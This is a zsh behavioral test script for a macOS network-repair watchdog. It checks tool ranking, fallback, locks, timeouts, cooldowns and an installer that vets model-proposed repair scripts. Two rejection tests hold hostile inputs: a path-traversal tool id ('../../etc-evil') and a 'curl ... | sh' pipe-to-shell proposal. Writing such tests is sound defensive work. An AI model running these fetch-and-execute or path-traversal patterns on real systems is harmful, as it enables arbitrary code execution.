#!/bin/zsh
# tests/behavioral.sh — behavioral tests for the ranking, memory and
# fallback logic in watcher.sh. Runs on any machine with zsh and awk
# (no macOS, no Apple Intelligence, no real network). The CI runs it on
# ubuntu-latest; a real end-to-end test still needs a Mac.
#
# What it covers (the audit's P0/P1 concerns):
#   1. Ranking: a 19/20 tool beats a 5/5 tool (more evidence wins);
#      a candidate never wins (it is not admitted to real repair);
#      a preferred with 0/10 loses to a verified tool with a good record.
#   2. Fallback: a high-scored tool with no implementation is skipped
#      and the next implemented tool wins — it must not block repair.
#   3. verify_hypothesis: a hypothesis whose first-mentioned symptom
#      (the claimed cause) was not broken is UNKNOWN, even if a broken
#      symptom also appears in the text.
#   4. apply_tool_evals: only tools that actually ran are applied.
#   5. filter_history_by_symptoms: the model's old prose (ANALYSIS:)
#      is stripped, only facts are passed on.
#   6. filter_hypotheses_by_symptoms: capped at 10 rows, refuted ones
#      excluded.
#   7. Lock: a stale lock (dead PID) is removed; a live lock skips.
#   8. Candidate selection: only candidates are listed, ranked by the
#      same smoothed rate; admitted tools are not in the list.
#   9. Last attempt: when the admitted tool fails, a candidate runs
#      and its verified success is recorded.
#  10. New-tool installer: a NEW-TOOL proposal is installed as a
#      candidate; a bad id is rejected; re-installing is a no-op.
#  11. All admitted tools first: when two admitted tools exist, both
#      are tried before any candidate.
#  12. Timeout: a hanging tool is killed with its process tree after
#      TOOL_TIMEOUT and does not hang the watcher.
#  13. Cooldown: three consecutive failures put a tool in cooldown; a
#      success resets it.
#  14. Installer code checks: a syntax error and a denylisted pattern
#      are rejected; a valid tool is installed with a manifest row.
#  15. Ping candidates: a candidate for ping runs (ping has no
#      admitted reflex).
#  16. Analyst input: TOOL_RESULTS lists each tool with its result.
#  17. Timing: the recorded duration includes the settle verification.
#  18. Registry lock: the lock is acquired and released; a stale lock
#      is removed.
#
# Usage: zsh tests/behavioral.sh   (exit 0 = all pass, exit 1 = failure)

set -u
ROOT="${0:A:h:h}"
WATCHER="$ROOT/watcher.sh"
TMP=$(mktemp -d /tmp/mac-watchdog-behavioral.XXXXXX)
trap 'rm -rf "$TMP"' EXIT
FAIL=0

pass() { echo "PASS: $1"; }
fail() { echo "FAIL: $1"; FAIL=1; }
check() { # check <label> <expected> <actual>
  if [ "$2" = "$3" ]; then pass "$1"; else fail "$1 (expected '$2', got '$3')"; fi
}

# --- Load the pure functions from watcher.sh (without running it). ---
export WATCHDOG_DIR="$TMP/wd" TOOLS="$TMP/tools.tsv" LOG="$TMP/watcher.log"
ATTEMPTS="$TMP/tool-attempts.log"
COOLDOWN_FILE="$TMP/wd/tools-cooldown.tsv"
MANIFEST="$TMP/wd/tools-manifest.tsv"
TOOL_TIMEOUT="${TOOL_TIMEOUT:-120}"
COOLDOWN_FAILURES="${COOLDOWN_FAILURES:-3}"
COOLDOWN_SECONDS="${COOLDOWN_SECONDS:-86400}"
mkdir -p "$WATCHDOG_DIR" "$WATCHDOG_DIR/tools"
: > "$LOG"; : > "$ATTEMPTS"
for _fn in select_tool_for_symptom select_candidate_for_symptom \
           tool_is_implemented tool_in_cooldown tool_integrity_ok \
           registry_lock registry_unlock kill_tree run_to \
           verify_hypothesis \
           apply_tool_evals filter_history_by_symptoms \
           filter_hypotheses_by_symptoms record_tool_run run_one_tool run_reflexes; do
  _src=$(sed -n "/^$_fn()/,/^}/p" "$WATCHER")
  [ -n "$_src" ] || { echo "FAIL: function $_fn not found in watcher.sh"; exit 1; }
  eval "$_src"
done
# install_new_tools lives in review.sh (with its own registry lock).
REVIEW="$ROOT/review.sh"
for _fn in registry_lock registry_unlock install_new_tools; do
  _src=$(sed -n "/^$_fn()/,/^}/p" "$REVIEW")
  [ -n "$_src" ] || { echo "FAIL: function $_fn not found in review.sh"; exit 1; }
  eval "$_src"
done

# --- 1. Ranking. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tool-a\ttool-a\tpreferred\t20\t19\t20\ttailscale\n' >> "$TOOLS"
printf 'tool-b\ttool-b\tverified\t5\t5\t5\ttailscale\n' >> "$TOOLS"
printf 'tool-c\ttool-c\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
printf 'tool-d\ttool-d\tpreferred\t10\t0\t10\ttailscale\n' >> "$TOOLS"
_ranked=$(select_tool_for_symptom tailscale)
_first=$(echo "$_ranked" | head -1)
check "ranking: 19/20 beats 5/5" "tool-a" "$_first"
echo "$_ranked" | grep -q "tool-c" && fail "ranking: candidate is listed" || pass "ranking: candidate excluded"
_last=$(echo "$_ranked" | tail -1)
check "ranking: 0/10 preferred is last" "tool-d" "$_last"

# --- 2. Fallback to an implemented tool. ---
# tool-a is top-ranked but has no implementation (not a builtin, no script).
# tool-b is verified but also has no script. tailscale-up is a builtin.
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'ghost\tghost\tpreferred\t20\t19\t20\ttailscale\n' >> "$TOOLS"
printf 'tailscale-up\ttailscale-up\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
_first_impl=""
for _c in $(select_tool_for_symptom tailscale); do
  if tool_is_implemented "$_c"; then _first_impl="$_c"; break; fi
done
check "fallback: first implemented tool wins" "tailscale-up" "$_first_impl"
tool_is_implemented ghost && fail "fallback: ghost is implemented" || pass "fallback: ghost is not implemented"
tool_is_implemented tailscale-up && pass "fallback: builtin is implemented" || fail "fallback: builtin is not implemented"

# --- 3. verify_hypothesis: first-mentioned symptom is the claimed cause. ---
_out=$(verify_hypothesis "HYPOTHESIS: DNS failure caused the Tailscale shutdown | CONFIDENCE: PATTERN | REFUTES: none" "tailscale" | head -1)
check "verify: DNS-as-cause for tailscale-only is UNKNOWN" "HYPOTHESIS: UNKNOWN | CONFIDENCE: HYPOTHESIS | REFUTES: none" "$_out"
_out=$(verify_hypothesis "HYPOTHESIS: Tailscale service stopped responding | CONFIDENCE: HYPOTHESIS | REFUTES: none" "tailscale" | head -1)
check "verify: Tailscale-as-cause for tailscale passes" "HYPOTHESIS: Tailscale service stopped responding | CONFIDENCE: HYPOTHESIS | REFUTES: none" "$_out"
_out=$(verify_hypothesis "HYPOTHESIS: DNS servers unreachable after wake | CONFIDENCE: HYPOTHESIS | REFUTES: none" "dns" | head -1)
check "verify: DNS-as-cause for dns passes" "HYPOTHESIS: DNS servers unreachable after wake | CONFIDENCE: HYPOTHESIS | REFUTES: none" "$_out"

# --- 4. apply_tool_evals: only tools that ran. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tailscale-up\ttailscale-up\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
printf 'dns-reset\tdns-reset\tverified\t2\t2\t2\tdns\n' >> "$TOOLS"
apply_tool_evals "TOOL-EVAL: tailscale-up | preferred | fast and consistent
TOOL-EVAL: dns-reset | verified | temporary fix" "tailscale-up"
_state=$(awk -F'\t' '$1=="dns-reset"{print $3}' "$TOOLS")
check "tool-eval: dns-reset not re-applied (did not run)" "verified" "$_state"
grep -q "did not run in this incident" "$LOG" && pass "tool-eval: skip is logged" || fail "tool-eval: skip is not logged"

# --- 5. History: the model's old prose is stripped. ---
cat > "$TMP/inc.log" <<'EOF'
=== 2026-11-24 00:40:00 INCIDENT ===
SYMPTOMS: tailscale
REFLEXES: tailscale-up (rc=0)
OUTCOME: FIXED-BY-REFLEX
ANALYSIS: The model once thought this was DNS. Old prose, must not be shown again.
CAUSE: HYPOTHESIS: Transient state inconsistency in Tailscale service | CONFIDENCE: HYPOTHESIS | REFUTES: none
=== 2026-11-24 00:44:00 INCIDENT ===
SYMPTOMS: dns
REFLEXES: dns-reset (rc=0)
OUTCOME: FIXED-BY-REFLEX
ANALYSIS: DNS was broken.
CAUSE: HYPOTHESIS: DNS fails after Mac wakes | CONFIDENCE: PATTERN | REFUTES: none
EOF
_hist=$(filter_history_by_symptoms "$TMP/inc.log" "tailscale" 80)
echo "$_hist" | grep -q "ANALYSIS:" && fail "history: ANALYSIS prose leaked" || pass "history: ANALYSIS prose stripped"
echo "$_hist" | grep -q "SYMPTOMS: tailscale" && pass "history: tailscale block kept" || fail "history: tailscale block missing"
echo "$_hist" | grep -q "SYMPTOMS: dns" && fail "history: dns block leaked" || pass "history: dns block filtered out"

# --- 6. Hypotheses: capped at 10, refuted excluded. ---
printf 'id\tfirst_seen\tlast_seen\toccurrences\trefutations\tconfidence\tstatus\ttext\tevidence\n' > "$TMP/hyp.tsv"
for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
  printf "H$i\t2026-11-24 00:00:0$i\t2026-11-24 00:00:0$i\t1\t0\tHYPOTHESIS\tactive\tHypothesis $i about tailscale\t2026-11-24:tailscale\n" >> "$TMP/hyp.tsv"
done
printf 'H99\t2026-11-20 00:00:00\t2026-11-20 00:00:00\t5\t3\tPATTERN\trefuted\tRetired hypothesis about tailscale\t2026-11-20:dns\n' >> "$TMP/hyp.tsv"
_rows=$(filter_hypotheses_by_symptoms "$TMP/hyp.tsv" "tailscale" | tail -n +2 | wc -l | tr -d ' ')
check "hypotheses: capped at 10 rows" "10" "$_rows"
filter_hypotheses_by_symptoms "$TMP/hyp.tsv" "tailscale" | grep -q "H99" && fail "hypotheses: refuted row leaked" || pass "hypotheses: refuted row excluded"

# --- 7. Lock: stale is removed, live skips. ---
# acquire_lock is now a function, so the test calls it directly.
for _fn in acquire_lock; do
  _src=$(sed -n "/^$_fn()/,/^}/p" "$WATCHER")
  [ -n "$_src" ] || { echo "FAIL: function $_fn not found in watcher.sh"; exit 1; }
  eval "$_src"
done
LOCK="$TMP/watcher.lock"
# Stale: dead PID, old file.
echo "999999" > "$LOCK"
touch -t 202001010000 "$LOCK" 2>/dev/null || touch -d "2020-01-01" "$LOCK" 2>/dev/null
if acquire_lock; then
  pass "lock: stale lock removed and acquired"
  rm -f "$LOCK"; trap - EXIT
else
  fail "lock: stale lock blocked the run"
fi
# Live: a lock held by a running watcher process. Start a background
# zsh that holds the lock file with its own PID and sleeps, then check
# that acquire_lock refuses.
( echo $$ > "$LOCK"; sleep 5 ) &
_bg=$!
sleep 0.5
# Rewrite the lock with the background shell's PID (it is a zsh, and
# its command line contains the test script name, not "watcher" — so
# the PID-reuse check would treat it as stale. To test the live path
# properly, use a fake watcher process instead: a sleep whose args
# contain "watcher".
kill $_bg 2>/dev/null; wait $_bg 2>/dev/null
zsh -c 'echo $$ > "'"$LOCK"'"; exec -a watcher.sh sleep 5' &
_bg2=$!
sleep 0.5
if acquire_lock; then
  fail "lock: live lock did not block the run"
  rm -f "$LOCK"; trap - EXIT
else
  pass "lock: live lock skips the run"
fi
kill $_bg2 2>/dev/null; wait $_bg2 2>/dev/null; rm -f "$LOCK"

# --- 8. Candidate selection: candidates only, ranked by rate. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tailscale-up\ttailscale-up\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
printf 'cand-a\tcand-a\tcandidate\t4\t3\t8\ttailscale\n' >> "$TOOLS"
printf 'cand-b\tcand-b\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
printf 'cand-c\tcand-c\tcandidate\t2\t0\t4\ttailscale\n' >> "$TOOLS"
_cands=$(select_candidate_for_symptom tailscale)
_first_cand=$(echo "$_cands" | head -1)
check "candidate-select: best-rate candidate first" "cand-a" "$_first_cand"
echo "$_cands" | grep -q "tailscale-up" && fail "candidate-select: admitted tool listed" || pass "candidate-select: admitted tool excluded"
check "candidate-select: three candidates listed" "3" "$(echo "$_cands" | wc -l | tr -d ' ')"

# --- 9. Last attempt: the admitted tool fails, the candidate runs. ---
# Stub the macOS reflexes and the verifier: the admitted tool does not
# fix the symptom, the candidate does.
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tailscale-up\ttailscale-up\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
printf 'tailscale-restart\ttailscale-restart\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
cat > "$WATCHDOG_DIR/tools/tailscale-restart.sh" <<'SH'
#!/bin/zsh
touch "$WATCHDOG_DIR/candidate-ran"
SH
chmod +x "$WATCHDOG_DIR/tools/tailscale-restart.sh"
reflex_tailscale() { :; }  # admitted tool runs but fixes nothing
_verify_n=0
verify_item_settle() {
  _verify_n=$((_verify_n + 1))
  # First call (after the admitted tool): still broken. Second call
  # (after the candidate): fixed.
  [ "$_verify_n" -ge 2 ]
}
BROKEN_ITEMS=(tailscale)
SYMPTOMS="tailscale"
REFLEX_TS_KIND=""
run_reflexes
grep -q "LAST-ATTEMPT tailscale -> tailscale-restart" "$LOG" && pass "last-attempt: candidate tried after admitted failure" || fail "last-attempt: candidate not tried"
[ -f "$WATCHDOG_DIR/candidate-ran" ] && pass "last-attempt: candidate script executed" || fail "last-attempt: candidate script did not run"
_cand_runs=$(awk -F'\t' '$1=="tailscale-restart"{print $4}' "$TOOLS")
_cand_ok=$(awk -F'\t' '$1=="tailscale-restart"{print $5}' "$TOOLS")
check "last-attempt: candidate run recorded" "1" "$_cand_runs"
check "last-attempt: candidate success recorded" "1" "$_cand_ok"

# --- 10. New-tool installer: proposal -> candidate, bad id rejected. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
cat > "$TMP/proposals.md" <<'EOF'
## 2026-11-24 01:30:00 Daily review
NEW-TOOL: dns-flush-plus | dns | also flushes the mDNSResponder cache
SCRIPT:
dscacheutil -flushcache
killall -HUP mDNSResponder
END-SCRIPT
NEW-TOOL: ../../etc-evil | tailscale | bad id must be rejected
SCRIPT:
echo pwned
END-SCRIPT
EOF
install_new_tools "$TMP/proposals.md"
_state=$(awk -F'\t' '$1=="dns-flush-plus"{print $3}' "$TOOLS")
check "installer: new tool registered as candidate" "candidate" "$_state"
[ -x "$WATCHDOG_DIR/tools/dns-flush-plus.sh" ] && pass "installer: script installed and executable" || fail "installer: script missing or not executable"
awk -F'\t' '$1=="etc-evil"{found=1} END{exit found?0:1}' "$TOOLS" && fail "installer: bad id was registered" || pass "installer: bad id rejected"
[ -f "$WATCHDOG_DIR/tools/etc-evil.sh" ] && fail "installer: bad id wrote a file" || pass "installer: bad id wrote no file"
install_new_tools "$TMP/proposals.md"
_count=$(awk -F'\t' '$1=="dns-flush-plus"' "$TOOLS" | wc -l | tr -d ' ')
check "installer: re-install is a no-op" "1" "$_count"

# --- 11. All admitted tools first: A and B fail, C (candidate) runs. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tool-a\ttool-a\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
printf 'tool-b\ttool-b\tverified\t5\t4\t5\ttailscale\n' >> "$TOOLS"
printf 'tool-c\ttool-c\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
for _t in tool-a tool-b; do
  cat > "$WATCHDOG_DIR/tools/$_t.sh" <<'SH'
#!/bin/zsh
exit 0
SH
  chmod +x "$WATCHDOG_DIR/tools/$_t.sh"
done
cat > "$WATCHDOG_DIR/tools/tool-c.sh" <<'SH'
#!/bin/zsh
touch "$WATCHDOG_DIR/candidate-c-ran"
SH
chmod +x "$WATCHDOG_DIR/tools/tool-c.sh"
# Admitted tools are builtins only in the dispatch; tool-a/tool-b are
# external scripts, so they run via the generic branch. Verify fails
# for the first two attempts, succeeds on the third (the candidate).
_verify_n=0
verify_item_settle() {
  _verify_n=$((_verify_n + 1))
  [ "$_verify_n" -ge 3 ]
}
BROKEN_ITEMS=(tailscale)
SYMPTOMS="tailscale"
REFLEX_TS_KIND=""
run_reflexes
_b_runs=$(awk -F'\t' '$1=="tool-b"{print $4}' "$TOOLS")
_a_runs=$(awk -F'\t' '$1=="tool-a"{print $4}' "$TOOLS")
check "all-admitted-first: first admitted tool was tried (10->11)" "11" "$_a_runs"
check "all-admitted-first: second admitted tool was tried (5->6)" "6" "$_b_runs"
[ -f "$WATCHDOG_DIR/candidate-c-ran" ] && pass "all-admitted-first: candidate ran only after both admitted failed" || fail "all-admitted-first: candidate did not run"
_c_ok=$(awk -F'\t' '$1=="tool-c"{print $5}' "$TOOLS")
check "all-admitted-first: candidate success recorded" "1" "$_c_ok"

# --- 12. Timeout: a hanging tool is killed with its tree. ---
TOOL_TIMEOUT=3
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'hang-tool\thang-tool\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
cat > "$WATCHDOG_DIR/tools/hang-tool.sh" <<'SH'
#!/bin/zsh
sleep 60 &
wait
SH
chmod +x "$WATCHDOG_DIR/tools/hang-tool.sh"
# No admitted tool for tailscale in the registry, so the builtin
# default would run first — remove it from the ranking by giving the
# registry only the candidate, and stub the builtin to fail fast.
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'hang-tool\thang-tool\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
reflex_tailscale() { :; }
_verify_n=0
verify_item_settle() { return 1; }
BROKEN_ITEMS=(tailscale)
SYMPTOMS="tailscale"
REFLEX_TS_KIND=""
_start=$(date +%s)
run_reflexes
_elapsed=$(( $(date +%s) - _start ))
grep -q "TIMEOUT after 3s" "$LOG" && pass "timeout: hanging tool killed after TOOL_TIMEOUT" || fail "timeout: no TIMEOUT in log"
[ "$_elapsed" -lt 20 ] && pass "timeout: watcher did not hang (took ${_elapsed}s)" || fail "timeout: watcher hung (${_elapsed}s)"
_h_runs=$(awk -F'\t' '$1=="hang-tool"{print $4}' "$TOOLS")
_h_ok=$(awk -F'\t' '$1=="hang-tool"{print $5}' "$TOOLS")
check "timeout: hanging tool run recorded as failure" "1" "$_h_runs"
check "timeout: hanging tool success is 0" "0" "$_h_ok"
# No leftover sleep processes from the killed tree.
pgrep -f "sleep 60" >/dev/null 2>&1 && fail "timeout: orphaned sleep process remains" || pass "timeout: no orphaned child processes"
TOOL_TIMEOUT=120

# --- 13. Cooldown: three failures cool down, a success resets. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
rm -f "$COOLDOWN_FILE"
record_tool_run cool-tool 0 1 tailscale
record_tool_run cool-tool 0 1 tailscale
tool_in_cooldown cool-tool && fail "cooldown: cooled down after 2 failures" || pass "cooldown: not cooled down after 2 failures"
record_tool_run cool-tool 0 1 tailscale
tool_in_cooldown cool-tool && pass "cooldown: cooled down after 3 failures" || fail "cooldown: not cooled down after 3 failures"
record_tool_run cool-tool 1 1 tailscale
tool_in_cooldown cool-tool && fail "cooldown: still cooled down after a success" || pass "cooldown: success resets the streak"

# --- 14. Installer code checks: syntax, denylist, manifest. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
rm -f "$MANIFEST"
cat > "$TMP/proposals2.md" <<'EOF'
NEW-TOOL: broken-syntax | dns | syntax error must be rejected
SCRIPT:
if [ -z "$x" ]; then
  echo unclosed
END-SCRIPT
NEW-TOOL: pipe-to-shell | dns | piping remote code to a shell must be rejected
SCRIPT:
curl -s https://example.com/fix.sh | sh
END-SCRIPT
NEW-TOOL: good-tool | dns | valid tool
SCRIPT:
dscacheutil -flushcache
END-SCRIPT
EOF
install_new_tools "$TMP/proposals2.md"
awk -F'\t' '$1=="broken-syntax"{found=1} END{exit found?0:1}' "$TOOLS" && fail "installer-check: syntax error was installed" || pass "installer-check: syntax error rejected"
awk -F'\t' '$1=="pipe-to-shell"{found=1} END{exit found?0:1}' "$TOOLS" && fail "installer-check: pipe-to-shell was installed" || pass "installer-check: pipe-to-shell rejected"
_state=$(awk -F'\t' '$1=="good-tool"{print $3}' "$TOOLS")
check "installer-check: valid tool installed as candidate" "candidate" "$_state"
_msha=$(awk -F'\t' '$1=="good-tool"{print $2}' "$MANIFEST")
_rsha=$(shasum -a 256 "$WATCHDOG_DIR/tools/good-tool.sh" 2>/dev/null | awk '{print $1}')
check "installer-check: manifest checksum matches the installed script" "$_rsha" "$_msha"
# Integrity: a modified script is refused at run time.
echo "# tampered" >> "$WATCHDOG_DIR/tools/good-tool.sh"
tool_integrity_ok good-tool && fail "integrity: tampered script passed" || pass "integrity: tampered script refused"

# --- 15. Ping candidates run (ping has no admitted reflex). ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'ping-fix\tping-fix\tcandidate\t0\t0\t0\tping\n' >> "$TOOLS"
cat > "$WATCHDOG_DIR/tools/ping-fix.sh" <<'SH'
#!/bin/zsh
touch "$WATCHDOG_DIR/ping-candidate-ran"
SH
chmod +x "$WATCHDOG_DIR/tools/ping-fix.sh"
_verify_n=0
verify_item_settle() {
  _verify_n=$((_verify_n + 1))
  [ "$_verify_n" -ge 1 ]
}
BROKEN_ITEMS=(ping)
SYMPTOMS="ping"
REFLEX_TS_KIND=""
run_reflexes
[ -f "$WATCHDOG_DIR/ping-candidate-ran" ] && pass "ping-candidate: candidate ran for ping" || fail "ping-candidate: candidate did not run for ping"

# --- 16. Analyst input: TOOL_RESULTS lists each tool and its result. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tailscale-up\ttailscale-up\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
printf 'tailscale-restart\ttailscale-restart\tcandidate\t0\t0\t0\ttailscale\n' >> "$TOOLS"
cat > "$WATCHDOG_DIR/tools/tailscale-restart.sh" <<'SH'
#!/bin/zsh
touch "$WATCHDOG_DIR/candidate-ran"
SH
chmod +x "$WATCHDOG_DIR/tools/tailscale-restart.sh"
reflex_tailscale() { :; }
_verify_n=0
verify_item_settle() {
  _verify_n=$((_verify_n + 1))
  [ "$_verify_n" -ge 2 ]
}
BROKEN_ITEMS=(tailscale)
SYMPTOMS="tailscale"
REFLEX_TS_KIND=""
TOOL_RESULTS=""
run_reflexes
echo "$TOOL_RESULTS" | grep -q "tailscale-up:success=0" && pass "analyst-input: admitted tool result in TOOL_RESULTS" || fail "analyst-input: admitted tool result missing"
echo "$TOOL_RESULTS" | grep -q "tailscale-restart:success=1" && pass "analyst-input: candidate result in TOOL_RESULTS" || fail "analyst-input: candidate result missing"

# --- 17. Timing: the recorded duration includes the settle check. ---
printf 'id\tname\tstate\truns\tsuccesses\ttotal_seconds\tincident_types\n' > "$TOOLS"
printf 'tailscale-up\ttailscale-up\tpreferred\t10\t9\t10\ttailscale\n' >> "$TOOLS"
reflex_tailscale() { :; }
verify_item_settle() { sleep 2; return 0; }
BROKEN_ITEMS=(tailscale)
SYMPTOMS="tailscale"
REFLEX_TS_KIND=""
run_reflexes
_secs=$(awk -F'\t' '$1=="tailscale-up"{print $6}' "$TOOLS")
[ "${_secs:-0}" -ge 2 ] && pass "timing: recorded duration includes the settle check (${_secs}s)" || fail "timing: recorded duration is ${_secs}s, settle check not included"

# --- 18. Registry lock: acquire, release, stale removal. ---
registry_lock
[ -d "$WATCHDOG_DIR/.tools-lock" ] && pass "registry-lock: lock acquired" || fail "registry-lock: lock not created"
registry_unlock
[ -d "$WATCHDOG_DIR/.tools-lock" ] && fail "registry-lock: lock not released" || pass "registry-lock: lock released"
mkdir -p "$WATCHDOG_DIR/.tools-lock"
echo "999999" > "$WATCHDOG_DIR/.tools-lock/pid"
touch -t 202001010000 "$WATCHDOG_DIR/.tools-lock" 2>/dev/null || touch -d "2020-01-01" "$WATCHDOG_DIR/.tools-lock" 2>/dev/null
registry_lock
[ -d "$WATCHDOG_DIR/.tools-lock" ] && pass "registry-lock: stale lock removed and re-acquired" || fail "registry-lock: stale lock not handled"
registry_unlock

if [ "$FAIL" -eq 0 ]; then echo "ALL BEHAVIORAL TESTS PASSED"; exit 0; else echo "BEHAVIORAL TESTS FAILED"; exit 1; fi
